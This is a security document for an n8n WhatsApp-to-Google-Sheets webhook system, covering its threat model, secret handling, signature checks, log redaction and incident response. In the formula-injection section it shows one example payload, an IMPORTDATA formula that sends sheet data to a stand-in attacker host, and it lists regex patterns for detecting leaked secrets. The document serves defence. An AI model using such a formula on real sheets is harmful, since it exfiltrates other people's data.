# Security

## Threat model

This system receives untrusted HTTP from the public internet, holds credentials
that can send messages as your business, and stores customer conversation data.

| Threat | Impact | Control |
|---|---|---|
| Forged webhook (fake customer messages) | Poisoned data, bogus assignments | HMAC-SHA256 signature verification, fail closed |
| Endpoint hijack (someone binds their app) | Attacker receives your events | Verify-token handshake, fail closed |
| Credential leak via git | Full account takeover | `.env` git-ignored, `.env.example` placeholders only |
| Credential leak via workflow export | Token exfiltration | Tokens in n8n credentials, never in workflow JSON; validator scans for them |
| Credential leak via logs | Token exfiltration | All logging passes through `redact()` |
| n8n editor exposed to internet | Full system compromise | Not exposed in production; reverse proxy + auth |
| Malicious payload crashes the parser | Denial of service | Parser never throws; returns a reason |
| Zip bomb / oversized payload | Resource exhaustion | Compression caps pinned low |
| Supply-chain via community nodes | Arbitrary code execution | `N8N_UNVERIFIED_PACKAGES_ENABLED=false`, no external modules |
| Formula injection through a customer message | A formula runs in the team's sheet: data pulled out with `IMPORTXML`/`IMPORTDATA`, misleading links | Every value written is kept as text when it would start a formula ([below](#customer-text-is-never-a-formula)) |

---

## Secrets

### Never commit

```
META_ACCESS_TOKEN
META_APP_SECRET
GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY
WEBHOOK_VERIFY_TOKEN
N8N_ENCRYPTION_KEY
```

### Where they live

| Secret | Location | Protected by |
|---|---|---|
| All of the above | `.env` | `.gitignore` |
| Google service account | n8n credential store | `N8N_ENCRYPTION_KEY` |
| Meta bearer token | n8n credential store | `N8N_ENCRYPTION_KEY` |

### `.gitignore` coverage

```gitignore
.env
.env.*
!.env.example
*.pem
*.key
*credentials*.json
service-account*.json
```

Verify at any time:

```bash
git check-ignore -v .env          # must print a matching rule
git ls-files | grep -c "^\.env$"  # must print 0
```

### If a secret leaks

Rotate it. Deleting the commit, message, or screenshot is **not** sufficient —
assume anything that was exposed is compromised.

| Secret | How to rotate |
|---|---|
| `META_ACCESS_TOKEN` | Business Settings → System Users → revoke and regenerate |
| `META_APP_SECRET` | App Settings → Basic → Reset App Secret |
| `WEBHOOK_VERIFY_TOKEN` | Pick a new value in `.env`, update the Meta dashboard |
| Google service account | Cloud Console → delete the key, create a new one |
| `N8N_ENCRYPTION_KEY` | **Cannot be rotated without re-entering every credential** |

If the git history already contains a secret, rewriting history is not enough —
clones and forks retain it. Rotate first, then clean history if you wish.

---

## Webhook authenticity

### Signature verification

Every POST must carry `X-Hub-Signature-256: sha256=<hex>`, an HMAC-SHA256 of the
**raw request body** using the app secret.

Three properties matter:

1. **Raw bytes, not re-serialized JSON.** `JSON.stringify(JSON.parse(body))`
   changes key order and whitespace, producing a different digest. The Webhook
   node runs with `rawBody: true` and the HMAC is computed over the
   base64-decoded bytes from `binary.data.data`.
2. **Constant-time comparison.** `crypto.timingSafeEqual` on fixed-length
   buffers, so the comparison leaks no timing information.
3. **Fails closed.** No app secret configured ⇒ every request rejected. A
   missing environment variable must never silently disable authentication.

```
valid signature   -> 200 EVENT_RECEIVED
wrong signature   -> 401 invalid signature
missing signature -> 401 invalid signature
no app secret     -> 500 (misconfiguration, not acceptance)
```

All four verified live — see [TESTING.md](TESTING.md#level-3--live-webhook-tests).

### Verification handshake

The GET handshake compares `hub.verify_token` in constant time (both sides
hashed first, so length is not leaked either) and echoes `hub.challenge`
verbatim.

Fails closed when `WEBHOOK_VERIFY_TOKEN` is unset — otherwise anyone could point
their own Meta app at your endpoint and start feeding it events.

---

## Log redaction

Structured logs pass through `redact()`, which recursively masks any key
matching:

```
authorization | access_token | api_key | app_secret | private_key
verify_token  | encryption_key | password | secret | credential
bearer        | x-hub-signature
```

Masked values become `[REDACTED:Nchars]` — enough to distinguish "empty" from
"wrong length" without exposing the value. Non-secret fields (message ids, phone
numbers, text) are preserved so logs stay useful.

Depth-limited to 8 levels so a pathological structure cannot hang the redactor.

Verified by tests that assert specific secret values never appear in serialized
output.

### What is deliberately still logged

Customer phone numbers and message text **are** logged in some paths, because
without them the logs cannot answer operational questions. Treat n8n execution
logs as containing customer PII: restrict access, and set a retention policy.

---

## Customer text is never a formula

Every write to the sheet is `USER_ENTERED`: that is the default of n8n's Google
Sheets node (v4.7), and the API appends keep it so every cell keeps its type.
`USER_ENTERED` means Sheets reads a value the way it reads what a person types.
Until V2, a customer who sent `=IMPORTDATA("https://attacker.example/?"&A2)`
put a live formula into the team's sheet, in `last_message`,
`unanswered_messages` and the Messages tab. A WhatsApp profile name is
customer-controlled too.

Now every value a workflow writes goes through one guard, `SHEET_SAFE_JS` in
`build-workflows.js`: a string that starts with `=`, `+`, `-`, `@`, a tab or a
carriage return gets a leading apostrophe. Sheets stores the rest as text, does
not show the apostrophe, and the API reads the value back without it. Numbers
and booleans are not touched, so counts stay counts.

The build applies it to every Google Sheets node and every API append, so a
node added later cannot skip it, and `validate-workflows.js` fails the build if
any written value is unguarded. `tests/build/sheet-safe.test.js` sends a hostile
message through a real generated append.

Switching every write to `RAW` would also stop formulas, but it would change
the type of every cell the system writes today (numbers, `TRUE`/`FALSE`), which
the dashboard formulas rely on.

---

## Least privilege

| Setting | Value | Rationale |
|---|---|---|
| `NODE_FUNCTION_ALLOW_BUILTIN` | `crypto` | Only the one module needed for HMAC — not `*` |
| `NODE_FUNCTION_ALLOW_EXTERNAL` | **unset** | No npm packages in Code nodes |
| `N8N_UNVERIFIED_PACKAGES_ENABLED` | `false` | No community nodes |
| `N8N_DIAGNOSTICS_ENABLED` | `false` | No telemetry from a system handling customer data |
| Google service account | Sheets scope, one spreadsheet | Shared with exactly the one file it needs |
| Meta token permissions | `whatsapp_business_messaging`, `whatsapp_business_management` | Nothing broader |

### A note on `N8N_BLOCK_ENV_ACCESS_IN_NODE=false`

This is a **deliberate relaxation**. n8n 2.x blocks `$env` in nodes by default;
this system reads configuration from the environment specifically so it is not
hard-coded into workflow JSON, so the block had to be lifted.

The trade-off: Code nodes can read this container's environment. It is
acceptable because the container runs nothing but these workflows and its
environment *is* their configuration — and it is precisely why every log path
goes through `redact()`.

If you later add workflows from untrusted sources to this instance, revisit
this.

---

## Automated checks

`scripts/validation/validate-workflows.js` scans every generated workflow for:

| Pattern | Catches |
|---|---|
| `EAA[A-Za-z0-9]{20,}` | Meta access tokens |
| `-----BEGIN … PRIVATE KEY-----` | Private keys |
| `Bearer [A-Za-z0-9._-]{20,}` | Inline bearer tokens |
| `AIza[0-9A-Za-z_-]{35}` | Google API keys |
| `"type": "service_account"` | Pasted service account JSON |

Run it before every commit. It currently reports **0 findings** across all six
workflows.

`scripts/validation/check-env.js` reports configuration completeness and
**never prints a secret value** — only `<set: N chars>`.

---

## Production hardening

Beyond local development:

| Control | Why |
|---|---|
| **Do not expose n8n's editor** | Only `/webhook/*` needs to be public. Restrict `/` to a VPN or IP allowlist |
| **TLS everywhere** | Meta requires HTTPS. Let's Encrypt is free |
| **Reverse proxy** | Terminate TLS, rate-limit, and expose only the webhook paths |
| **Firewall** | Allow 80/443 only. Never expose 5678 directly |
| **Rate limiting** | Meta's traffic is bounded; anything above that is abuse |
| **Backups** | The n8n volume plus `N8N_ENCRYPTION_KEY` — a backup without the key is useless |
| **Restart policy** | `unless-stopped` so a reboot restores service |
| **Log retention** | Executions contain PII; cap `EXECUTIONS_DATA_MAX_AGE` |
| **Non-root** | The n8n image already runs as the `node` user |

Details: [DEPLOYMENT_HOSTINGER.md](DEPLOYMENT_HOSTINGER.md).

---

## Data protection

The system stores customer phone numbers, WhatsApp profile names, and message
content in Google Sheets and n8n execution logs.

| Consideration | Current state |
|---|---|
| Access control | Whoever can open the spreadsheet sees everything. Share deliberately |
| Retention | No automatic deletion. Define a policy before volume grows |
| Right to erasure | Manual: delete the customer's Conversations and Messages rows |
| Encryption at rest | Google's, plus n8n's credential encryption. Sheet *content* is not separately encrypted |
| Encryption in transit | TLS to Meta and Google |
| Data location | Google's infrastructure — relevant if you have residency requirements |

If you operate under GDPR or a similar regime, the spreadsheet is the system of
record and must be treated as such.

---

## Incident checklist

**Suspected credential leak**

1. Rotate the credential (table above)
2. Check Meta's app dashboard for unexpected activity
3. Check Google Cloud audit logs for unexpected Sheets access
4. Review n8n executions for messages you did not send
5. Rotate `N8N_ENCRYPTION_KEY` only if the n8n database itself was exposed

**Suspected forged webhooks**

1. Confirm `META_APP_SECRET` is correct — if signatures were passing, it is
   genuine Meta traffic
2. Look for 401s in the logs, which indicate rejected forgeries (the control
   working)
3. Check for Conversations rows with implausible phone numbers

**n8n compromise**

1. Stop the container
2. Rotate **every** credential — the encryption key protects the database, and
   an attacker with the container had both
3. Restore from a known-good backup
4. Review executions for unauthorized sends
